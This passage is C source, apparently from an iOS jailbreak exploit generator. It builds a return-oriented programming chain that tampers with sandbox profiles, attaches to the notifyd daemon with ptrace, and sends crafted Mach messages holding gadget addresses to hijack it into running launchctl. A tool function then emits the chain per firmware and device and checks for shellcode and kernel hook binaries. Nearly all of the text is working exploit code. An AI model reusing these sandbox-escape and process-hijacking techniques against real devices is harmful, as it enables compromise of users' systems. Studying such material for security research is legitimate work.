        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
        ropLoadReg0(aRacoonDst);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newString("seatbelt-profiles"), sizeof("seatbelt-profiles") - 1);

        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // profiles_loc to PLACE_HOLDER
        ropCall3(dscs + offsets->_dsc_memcpy, PLACE_HOLDER, newString("seatbelt-profil3s"), sizeof("seatbelt-profil3s") - 1);

        ropLoadReg0(aSize);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
        ropLoadReg0(aRacoonSrc);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrc to first PLACE_HOLDER
        ropCall2(dscs + offsets->_dsc_munmap, PLACE_HOLDER, PLACE_HOLDER);

        ropLoadReg0(aSize);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // st.st_size to second PLACE_HOLDER
        ropLoadReg0(aRacoonDst);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDst to first PLACE_HOLDER
        ropCall2(dscs + offsets->_dsc_munmap, PLACE_HOLDER, PLACE_HOLDER);

        ropLoadReg0(aRacoonSrcFd);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonSrcFd to PLACE_HOLDER
        ropCall1(dscs + offsets->_dsc_close, PLACE_HOLDER);

        ropLoadReg0(aRacoonDstFd);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonDstFd to PLACE_HOLDER
        ropCall1(dscs + offsets->_dsc_close, PLACE_HOLDER);

	// search notifyd pid : ----------------------------------------
	static int name[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL};
	Addr aLength = newInteger(0);
	Addr aProc = newInteger(0);
	Addr aPid = newInteger(0);
	Addr aName = newArray(name, 3);
	ropCall6(dscs + offsets->_dsc_sysctl, aName, 3, 0, aLength, 0, 0);

	// ropMalloc(aLength);
	ropLoadReg0(aLength);
	ropCall4Reg(dscs + offsets->_dsc_malloc);

	// ropSysctl(aName, 3, aProc, aLength, 0, 9);
	ropSaveReg0(aProc);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aProc to PLACE_HOLDER1
	ropCall6(dscs + offsets->_dsc_sysctl, aName, 3, PLACE_HOLDER, aLength, 0, 0);

	// ropMemmem(aProc, aLength, "\0\0notifyd", 9);
	ropLoadReg0(aProc);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN * 2 + ROP_LOAD_REG0_LEN + 0x04); // aProc to PLACE_HOLDER1
	ropLoadReg0(aLength);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aLength to PLACE_HOLDER2
	ropCall4(dscs + offsets->_dsc_memmem, PLACE_HOLDER, PLACE_HOLDER, newBinary("\0\0notifyd", 9), 9);

	ropSubReg0Const(137);
	ropDerefReg0();

	// ropSyslog(LOG_WARN, "notifyd pid: %d\n", aPid);
	ropSaveReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
	ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("notifyd pid: %d\n"), PLACE_HOLDER);

        Addr aShmAddress = newInteger(0);
        Addr aRegion = newInteger(0); // pod2g: why not uint64_t ?
        Addr aRegions = newBuffer(sizeof(uint32_t) * 44 * 3);
        Addr aRegionInfo = newBuffer(sizeof(struct proc_regionwithpathinfo));
        int i;
        for(i = 0; i < 44; ++i)
        {
            ropLoadReg0(aPid);
            ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // aPid to first PLACE_HOLDER
            ropLoadReg0(aRegion);
            ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aRegion to second PLACE_HOLDER
            ropCall6(dscs + offsets->_dsc_proc_pidinfo, PLACE_HOLDER, PROC_PIDREGIONPATHINFO, PLACE_HOLDER, 0, aRegionInfo, sizeof(struct proc_regionwithpathinfo));
            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
            ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 0)));
            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_protection));
            ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 1)));
            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_share_mode));
            ropSaveReg0(aRegions + (sizeof(uint32_t) * ((i * 3) + 2)));
            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_size));
            ropMovReg1Reg0();
            ropLoadReg0(aRegionInfo + offsetof(struct proc_regionwithpathinfo, prp_prinfo.pri_address));
            ropAddReg0Reg1();
            ropSaveReg0(aRegion);
        }

        uint32_t search[2] = { (PROT_READ | PROT_WRITE), SM_SHARED };
        Addr aSearch = newArray(search, 2);
	ropCall4(dscs + offsets->_dsc_memmem, aRegions, sizeof(uint32_t) * 44 * 3, aSearch, sizeof(search));
	ropSubReg0Const(sizeof(uint32_t));
	ropDerefReg0();
        ropAddReg0Const(0xF00);
        ropSaveReg0(aShmAddress);

	// ropBootstrapLookUp(bootstrap_port, "com.apple.system.notification_center", port);
        Addr aPort = newInteger(0);
        ropCall2(dscs + offsets->_dsc_dlsym, (uint32_t)((intptr_t)RTLD_DEFAULT), newString("bootstrap_port"));
        ropDerefReg0();
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // bootstrap_port to PLACE_HOLDER
        ropCall3(dscs + offsets->_dsc_bootstrap_look_up, PLACE_HOLDER, newString("com.apple.system.notification_center"), aPort);

        ropLoadReg0(aPort);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
	ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Looked up notification center: %p\n"), PLACE_HOLDER);

	// ropPtrace(PT_ATTACH, aPid, 0, 0);
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_ptrace, PT_ATTACH, PLACE_HOLDER, 0, 0);
	ropLog("attached to notifyd\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropCall1(dscs + offsets->_dsc_sleep, 1);

	// ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + offsets->_dsc_bsdthread_terminate, 0);
	ropLog("continuing...\n");

	// ropPtrace(PT_DETACH, aPid, 0, 0); // please???
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_ptrace, PT_DETACH, PLACE_HOLDER, 0, 0);
	ropLog("detached!!!\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropCall1(dscs + offsets->_dsc_sleep, 1);

        Addr aLocalPort = newInteger(0);
        Addr aTaskPort = newInteger(0);
        ropCall0(dscs + offsets->_dsc_mach_task_self);
        ropSaveReg0(aTaskPort);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // taskPort to PLACE_HOLDER
        ropCall3(dscs + offsets->_dsc_mach_port_allocate, PLACE_HOLDER, MACH_PORT_RIGHT_RECEIVE, aLocalPort);
        ropLoadReg0(aTaskPort);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // taskPort to first PLACE_HOLDER
        ropLoadReg0(aLocalPort);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // localPort to second PLACE_HOLDER
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // localPort to third PLACE_HOLDER
        ropCall4(dscs + offsets->_dsc_mach_port_insert_right, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER, MACH_MSG_TYPE_MAKE_SEND);

        ropLoadReg0(aLocalPort);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
	ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("Local port: %p\n"), PLACE_HOLDER);

        struct trojan_msg msg;

        memset(&msg, 0, sizeof(msg));

        msg.header.msgh_bits = htole32(MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND));
        msg.header.msgh_size = htole32(sizeof(msg));
        msg.header.msgh_id = htole32(dscs + offsets->GADGET_ADD_SP_120_POP8_10_4567 - 100);
        msg.pc = htole32(dscs + offsets->GADGET_MOV_SP_R4_POP8_10_11_4567);

        Addr aMsg = newBinary(&msg, sizeof(struct trojan_msg));
        ropLoadReg0(aPort);
        ropSaveReg0(aMsg + offsetof(struct trojan_msg, header.msgh_remote_port));
        ropLoadReg0(aLocalPort);
        ropSaveReg0(aMsg + offsetof(struct trojan_msg, header.msgh_local_port));
        ropLoadReg0(aShmAddress);
        ropSaveReg0(aMsg + offsetof(struct trojan_msg, r4));

        ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        ropCall7(dscs + offsets->_dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

	// ropPtrace(PT_ATTACH, aPid, 0, 0);
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_ptrace, PT_ATTACH, PLACE_HOLDER, 0, 0);
	ropLog("attached to notifyd\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropCall1(dscs + offsets->_dsc_sleep, 1);

        Addr aNotifydStringArg0Address = newInteger(0);
        Addr aNotifydStringArg1Address = newInteger(0);
        Addr aNotifydStringArg2Address = newInteger(0);
        ropLoadReg0(aShmAddress);
        ropAddReg0Const(0x64);
        ropSaveReg0(aNotifydStringArg0Address);
        ropAddReg0Const(sizeof("/bin/launchctl"));
        ropSaveReg0(aNotifydStringArg1Address);
        ropAddReg0Const(sizeof("load"));
        ropSaveReg0(aNotifydStringArg2Address);

        Addr aRacoonStringArg0Address = newInteger(0);
        Addr aRacoonStringArg1Address = newInteger(0);
        Addr aRacoonStringArg2Address = newInteger(0);
        ropLoadReg0(aShmBaseAddress);
        ropAddReg0Const(0x64);
        ropSaveReg0(aRacoonStringArg0Address);
        ropAddReg0Const(sizeof("/bin/launchctl"));
        ropSaveReg0(aRacoonStringArg1Address);
        ropAddReg0Const(sizeof("load"));
        ropSaveReg0(aRacoonStringArg2Address);

        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x0C, dscs + offsets->GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x1C, dscs + offsets->GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x20, dscs + offsets->_dsc_exit);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + offsets->LIBC_POP_R0123);
        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C, aNotifydStringArg2Address);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x30, 0x0);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x34, 0x0);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + offsets->_dsc_chown);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x48, dscs + offsets->LIBC_POP_R0123);
        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x4C, aNotifydStringArg0Address);
        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x50, aNotifydStringArg0Address);
        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x54, aNotifydStringArg1Address);
        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x58, aNotifydStringArg2Address);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x5C, dscs + offsets->_dsc_execl);
        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x60, 0x0);

        ropLoadReg0(aRacoonStringArg0Address);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg0Address to PLACE_HOLDER
        ropCall2(dscs + offsets->_dsc_strcpy, PLACE_HOLDER, newString("/bin/launchctl"));

        ropLoadReg0(aRacoonStringArg1Address);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg1Address to PLACE_HOLDER
        ropCall2(dscs + offsets->_dsc_strcpy, PLACE_HOLDER, newString("load"));

        ropLoadReg0(aRacoonStringArg2Address);
        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg2Address to PLACE_HOLDER
        ropCall2(dscs + offsets->_dsc_strcpy, PLACE_HOLDER, newString("/private/var/mobile/Media/corona/jb.plist"));

	// ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + offsets->GADGET_HOLY, 0);
	ropLog("continuing...\n");

	// ropPtrace(PT_DETACH, aPid, 0, 0); // please???
	ropLoadReg0(aPid);
	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
	ropCall4(dscs + offsets->_dsc_ptrace, PT_DETACH, PLACE_HOLDER, 0, 0);
	ropLog("detached!!!\n");

	// ropSleep(1);
	ropLog("sleeping...");
	ropCall1(dscs + offsets->_dsc_sleep, 1);

	// -------------------------------------------------------------

	ropLog("Racoon ROP ended.\n");
	ropCall1(dscs + offsets->_dsc_exit, 0);

}

int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
{
	int device = -1;
	int firmware = -1;
	int i;
	for (i = 0; i < MAX_FIRMWARE; ++i) {
		if (strcmp(firmwareName, firmwares[i]) == 0) {
			firmware = i;
			break;
		}
	}

	if (firmware == -1) {
		fprintf(stderr, "Unrecognized firmware: %s\n", firmwareName);
		return -1;
	}

	for (i = 0; i < MAX_DEVICE; ++i) {
		if (strcmp(deviceName, devices[i]) == 0) {
			device = i;
			break;
		}
	}

        if (device == -1) {
		fprintf(stderr, "Unrecognized device: %s\n", deviceName);
		return -1;
	}

	// check for required files
	char dPath[1024];
	char fName[1024];
	FILE *f = NULL;

	// data path
        snprintf(dPath, sizeof(dPath), "data/%s/%s/fsgen", firmwareName, deviceName);

	// check files
	snprintf(fName, sizeof(fName), "%s/sysent_1c50", dPath);
	f = fopen(fName, "rb");
	if (!f) {
		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
		return -2;
	}
	fclose(f);

	snprintf(fName, sizeof(fName), "%s/zfreehooker.bin", dPath);
	f = fopen(fName, "rb");
	if (!f) {
		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
		return -2;
	}
	fclose(f);

	snprintf(fName, sizeof(fName), "%s/zfreehook.bin", dPath);
	f = fopen(fName, "rb");
	if (!f) {
		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
		return -2;
	}
	fclose(f);

	snprintf(fName, sizeof(fName), "%s/shellcode.bin", dPath);
	f = fopen(fName, "rb");
	if (!f) {
		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
		return -2;
	}
	fclose(f);

	snprintf(fName, sizeof(fName), "%s/sb_evaluatehooker.bin", dPath);
	f = fopen(fName, "rb");
	if (!f) {
		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
		return -2;
	}
	fclose(f);

	snprintf(fName, sizeof(fName), "%s/sb_evaluatehook.bin", dPath);
	f = fopen(fName, "rb");
	if (!f) {
		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
		return -2;
	}
	fclose(f);

	return 0;
}

int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const char* deviceName, int pid_len, unsigned int slide)
{
        outFile = out;

        STRLEN_PID = pid_len;
        dscs = slide;

        p2DataLo = 0;
        p3Data = 0;
        firstP2Write = 1;
        firstP3Write = 1;
        lines = 0;

        ropFile = NULL;
        ropVarsFile = NULL;
        ropWriteMode = ROP_MODE_MEM;
        ropWriteVarsMode = ROP_MODE_MEM;
        ropWriteAddr = ROP2_ABS_ADDR;
        ropFileAddr = 0;
        memset(vars, 0, sizeof(vars));
        varsBaseAddr = VARS_ABS_ADDR_1;
        varsWritten = 0;

        int device = -1;
        int firmware = -1;
	int i;
        for(i = 0; i < MAX_FIRMWARE; ++i)
        {
            if(strcmp(firmwareName, firmwares[i]) == 0)
            {
                firmware = i;
                break;
            }
        }

        if(firmware == -1)
        {
            fprintf(stderr, "Unrecognized firmware: %s\n", firmwareName);
            return -1;
        }

        for(i = 0; i < MAX_DEVICE; ++i)
        {
            if(strcmp(deviceName, devices[i]) == 0)
            {
                device = i;
                break;
            }
        }

        if(device == -1)
        {
            fprintf(stderr, "Unrecognized device: %s\n", deviceName);
            return -1;
        }

        if(is_bootstrap)
            constants = global_constants_bootstrap[firmware][device];
        else
            constants = global_constants[firmware][device];

        offsets = global_offsets[firmware][device];

        snprintf(dataPath, sizeof(dataPath), "data/%s/%s/fsgen", firmwareName, deviceName);

	ropOpen();

	ropStackPivotLo(ROP2_ABS_ADDR);

        if(is_bootstrap)
            bootstrap();
        else
            exploit();

	ropClose();

        return 0;
}

#ifdef FSGEN_MAIN
int main(int argc, char* argv[]) {
	if (argc < 6) {
		fprintf(stderr, "syntax: %s <is_bootstrap, 0|1> <firmware> <device> <pid length> <dyld shared cache slide, ex: 0x40000>\n", argv[0]);
		exit(1);
	}

        int is_bootstrap;
        unsigned int slide;
        int pid_len;
        sscanf(argv[1], "%d", &is_bootstrap);
	sscanf(argv[4], "%d", &pid_len);
	sscanf(argv[5], "0x%x", &slide);
	fprintf(stderr, "pid length: %d, dyld shared cache slide: 0x%x\n", pid_len, slide);

        return generate_rop(stdout, is_bootstrap, argv[2], argv[3], pid_len, slide);
}
#endif
